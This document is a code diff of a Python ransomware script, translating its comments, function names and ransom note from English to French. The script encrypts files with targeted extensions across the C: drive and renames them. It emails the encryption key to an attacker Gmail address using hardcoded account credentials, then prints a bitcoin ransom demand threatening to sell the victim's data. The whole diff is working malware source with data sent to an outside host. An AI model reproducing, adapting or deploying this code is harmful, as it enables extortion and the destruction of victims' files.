@@ -1,18 +1,81 @@
-#!/usr/bin/python3
-from getpass import getuser
+#!/usr/bin/python3  # Spécifie l'interpréteur Python à utiliser
 from socket import gethostname  # Importer la fonction gethostname pour obtenir le nom d'hôte
 from os import walk, path, rename  # Importer les fonctions walk, path, rename
-from subprocess import call  # Importer la fonction call du module subprocess
 from cryptography.fernet import Fernet  # Importer la classe Fernet du module cryptography.fernet
-from win32ui import MessageBox  # Importer la classe MessageBox du module win32ui
-from win32con import MB_ICONWARNING  # Importer la constante MB_ICONWARNING du module win32con
 import smtplib  # Importer le module smtplib pour envoyer des emails
 from email.mime.text import MIMEText  # Importer MIMEText pour créer le contenu de l'email
 from email.mime.multipart import MIMEMultipart  # Importer MIMEMultipart pour créer un email multipart
 
+# Fonction pour envoyer la clé par email
+def envoyer_cle_email(cle: str, destinataire: str):
+    expediteur = "klogger810@gmail.com"  # Adresse email de l'expéditeur
+    mot_de_passe = "ldmj xpqq bahe lhvn"  # Mot de passe de l'email
+    sujet = "Clé de déchiffrement"  # Sujet de l'email
+    nom_hote = gethostname()  # Obtient le nom d'hôte de la machine
+    corps = f"Voici la clé de déchiffrement : {cle}\nPour l'ordinateur avec ID : {nom_hote}"  # Corps de l'email
+
+    message = MIMEMultipart()  # Création de l'objet MIMEMultipart
+    message['From'] = expediteur  # Définir l'expéditeur
+    message['To'] = destinataire  # Définir le destinataire
+    message['Subject'] = sujet  # Définir le sujet
+    message.attach(MIMEText(corps, 'plain'))  # Attacher le corps de l'email en texte brut
+
+    try:
+        serveur = smtplib.SMTP('smtp.gmail.com', 587)  # Connexion au serveur SMTP de Gmail
+        serveur.starttls()  # Démarrer le chiffrement TLS
+        serveur.login(expediteur, mot_de_passe)  # Connexion au compte email
+        texte = message.as_string()  # Conversion de l'objet message en chaîne de caractères
+        serveur.sendmail(expediteur, destinataire, texte)  # Envoi de l'email
+        serveur.quit()  # Fermeture de la connexion au serveur SMTP
+        print("Email envoyé avec succès.")  # Message de confirmation d'envoi
+    except Exception as e:
+        print(f"Échec de l'envoi de l'email : {e}")  # Message d'erreur en cas d'échec
+
+# Fonction pour chiffrer les fichiers
+def chiffrer_fichiers(cle: bytes):
+    fer = Fernet(cle)  # Créer un objet Fernet avec la clé fournie
+    for racine, dossiers, fichiers in walk("C:\\"):  # Parcourir tous les fichiers du disque C:
+        for fichier in fichiers:
+            chemin_fichier = path.join(racine, fichier)  # Obtenir le chemin complet du fichier
+            extension = path.splitext(chemin_fichier)[1]  # Obtenir l'extension du fichier
+            if extension in extensions:  # Vérifier si l'extension du fichier est ciblée
+                try:
+                    with open(chemin_fichier, "rb") as fichier_original:  # Ouvrir le fichier en lecture binaire
+                        original = fichier_original.read()  # Lire le contenu du fichier
+                    chiffre = fer.encrypt(original)  # Chiffrer le contenu du fichier
+                    with open(chemin_fichier, "wb") as fichier_chiffre:  # Ouvrir le fichier en écriture binaire
+                        fichier_chiffre.write(chiffre)  # Écrire le contenu chiffré dans le fichier
+                    nom_chiffre = fer.encrypt(fichier.encode())  # Chiffrer le nom du fichier
+                    nouveau_chemin = path.join(racine, nom_chiffre.decode())  # Créer le nouveau chemin avec le nom chiffré
+                    rename(chemin_fichier, nouveau_chemin)  # Renommer le fichier avec le nom chiffré
+                except:
+                    pass  # Ignorer les erreurs
+
+# Fonction pour déchiffrer les fichiers
+def dechiffrer_fichiers(cle: bytes):
+    fer = Fernet(cle)  # Créer un objet Fernet avec la clé fournie
+    for racine, dossiers, fichiers in walk("C:\\"):  # Parcourir tous les fichiers du disque C:
+        for fichier in fichiers:
+            chemin_fichier = path.join(racine, fichier)  # Obtenir le chemin complet du fichier
+            extension = path.splitext(chemin_fichier)[1]  # Obtenir l'extension du fichier
+            if extension in extensions:  # Vérifier si l'extension du fichier est ciblée
+                try:
+                    with open(chemin_fichier, "rb") as fichier_chiffre:  # Ouvrir le fichier en lecture binaire
+                        chiffre = fichier_chiffre.read()  # Lire le contenu chiffré du fichier
+                    dechiffre = fer.decrypt(chiffre)  # Déchiffrer le contenu du fichier
+                    with open(chemin_fichier, "wb") as fichier_dechiffre:  # Ouvrir le fichier en écriture binaire
+                        fichier_dechiffre.write(dechiffre)  # Écrire le contenu déchiffré dans le fichier
+                    nom_dechiffre = fer.decrypt(fichier.encode())  # Déchiffrer le nom du fichier
+                    nouveau_chemin = path.join(racine, nom_dechiffre.decode())  # Créer le nouveau chemin avec le nom déchiffré
+                    rename(chemin_fichier, nouveau_chemin)  # Renommer le fichier avec le nom déchiffré
+                except:
+                    print("La clé insérée est incorrecte.")  # Afficher un message d'erreur
+                    return
+
 # Fonction pour obtenir les extensions de fichiers
-def get_extensions() -> list:
+def obtenir_extensions() -> list:
     return [
+        # Liste des extensions de fichiers à cibler
         ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".sc2save", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb",
         ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".tax",
         ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", ".sb", ".fos", ".mcgame", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
@@ -27,117 +90,50 @@ def get_extensions() -> list:
         ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"
     ]
 
-# Extensions à chiffrer/déchiffrer
-extensions = get_extensions()
+extensions=obtenir_extensions()
 
-# Fonction pour chiffrer les fichiers
-def encrypt_files(key: bytes):
-    f = Fernet(key)
-    for root, dirs, files in walk("C:\\"):
-        for file in files:
-            fpath  = path.join(root, file)
-            ext = path.splitext(fpath)[1]
-            if ext in extensions:
-                try:
-                    with open(fpath, "rb") as of:
-                        original = of.read()
-                    encrypted = f.encrypt(original)
-                    with open(fpath, "wb") as of:
-                        of.write(encrypted)
-                    filename = f.encrypt(file.encode())
-                    newpath = path.join(root, filename.decode())
-                    rename(fpath, newpath)
-                except:
-                    pass
-
-# Fonction pour déchiffrer les fichiers
-def decrypt_files(key: bytes):
-    f = Fernet(key)
-    for root, dirs, files in walk("C:\\"):
-        for file in files:
-            fpath  = path.join(root, file)
-            ext = path.splitext(fpath)[1]
-            if ext in extensions:
-                try:
-                    with open(fpath, "rb") as of:
-                        encrypted = of.read()
-                    decrypted = f.decrypt(encrypted)
-                    with open(fpath, "wb") as of:
-                        of.write(decrypted)
-                    filename = f.decrypt(file.encode())
-                    newpath = path.join(root, filename.decode())
-                    rename(fpath, newpath)
-                except:
-                    MessageBox("The inserted key is wrong.", MB_ICONWARNING)
-                    return
-
-# Fonction pour envoyer la clé par email
-def send_key_via_email(key: str, recipient: str):
-    sender = "klogger810@gmail.com"
-    password = "ldmj xpqq bahe lhvn"
-    subject = "Decryption Key"
-    hostname = gethostname()
-    body = f"Here is the decryption key: {key}\nFor the computer with ID: {hostname}"
-
-    msg = MIMEMultipart()
-    msg['From'] = sender
-    msg['To'] = recipient
-    msg['Subject'] = subject
-    msg.attach(MIMEText(body, 'plain'))
-
-    try:
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(sender, password)
-        text = msg.as_string()
-        server.sendmail(sender, recipient, text)
-        server.quit()
-        print("Email sent successfully")
-    except Exception as e:
-        print(f"Failed to send email: {e}")
 
 # Fonction principale
-def main():
-    key = Fernet.generate_key()
-    f = Fernet(key)
-    hostname = gethostname()
+def principal():
+    cle = Fernet.generate_key()  # Générer une clé de chiffrement
+    fer = Fernet(cle)  # Créer un objet Fernet avec la clé générée
+    nom_hote = gethostname()  # Obtenir le nom d'hôte de la machine
 
     # Envoyer la clé par email
-    send_key_via_email(key.decode(), "loggerkey285@gmail.com")
+    envoyer_cle_email(cle.decode(), "loggerkey285@gmail.com")  # Envoyer la clé de chiffrement par email
 
     # Chiffrer les fichiers
-    encrypt_files(key)
- 
- # Message d'avertissement et instructions de sauvegarde
-    
-    print("All of your important files have been encrypted\n"
-        "You have 3 hours to send 300$ in bitcoins to this address -> www.example.com.\n"
-        "If you do not, all of your important data will be sold, all of your passwords will be sold\n"
-        "IMPORTANT!\n"
-            "You'll need this for decrypting your files.\n"
-            f"This is your id, {hostname}, put this somewhere safe, because when you'll send the money we will need this.\n"
-            "All of your important files have been encrypted, there's no way you can get them back except one.\n"
-            "For getting all of your files back you need to send 300$ in bitcoin to this address -> www.example.com.\n"
-            "After you've paid the 300$ you'll eventually get your files back, don't try to do these things:\n"
-            "1) Decrypt the files yourself.\n"
-            "2) Seek for help.\n"
-            "3) Send less money.\n"
-            "4) Forget, delete, or lose your id.\n"
-            "Good luck.")
+    chiffrer_fichiers(cle)  # Chiffrer les fichiers avec la clé générée
 
-    
+    # Message d'avertissement et instructions de paiement
+    print("Attention ! Votre disque dur a été chiffré.\n"
+      "Vous avez 5 heures pour envoyer 600€ en bitcoins à l'adresse suivante : www.example.com.\n"
+      "Si vous ne suivez pas cette instruction, toutes vos données importantes, ainsi que vos mots de passe, seront vendus.\n"
+      "IMPORTANT :\n"
+      "Vous aurez besoin de ces informations pour déchiffrer vos fichiers.\n"
+      f"Voici votre identifiant : {nom_hote}. Conservez-le en sécurité car il sera nécessaire lors de la confirmation de votre paiement.\n"
+      "Il n'existe qu'une seule manière de récupérer vos fichiers :\n"
+      "Envoyez 600€ en bitcoins à l'adresse suivante : www.example.com.\n"
+      "Après réception du paiement, nous vous fournirons les instructions pour récupérer vos fichiers. Ne tentez pas les actions suivantes :\n"
+      "1) Tenter de déchiffrer les fichiers par vous-même.\n"
+      "2) Chercher une aide extérieure.\n"
+      "3) Envoyer une somme différente.\n"
+      "4) Perdre, supprimer ou oublier votre identifiant.\n"
+      "Nous espérons que vous suivrez ces instructions.")
+
     # Demander la clé de déchiffrement à l'utilisateur
     while True:
-        input_key = input("Veuillez entrer la clé de déchiffrement : ").encode()
+        cle_saisie = input("Veuillez entrer la clé de déchiffrement : ").encode()  # Demander la clé de déchiffrement
         try:
-            f = Fernet(input_key)
-            decrypt_files(input_key)
-            print("Votre système a été déchiffré avec succès.")
+            fer = Fernet(cle_saisie)  # Créer un objet Fernet avec la clé saisie
+            dechiffrer_fichiers(cle_saisie)  # Déchiffrer les fichiers avec la clé saisie
+            print("Votre système a été déchiffré avec succès.")  # Message de succès
             break
         except Exception as e:
-            print("Clé de déchiffrement incorrecte, veuillez réessayer.")
+            print("Clé de déchiffrement incorrecte, veuillez réessayer.")  # Message d'erreur en cas d'échec
 
-    
-            
+# Début du programme
 if __name__ == "__main__":
-    main()
+    principal()  # Appeler la fonction principale
+
+
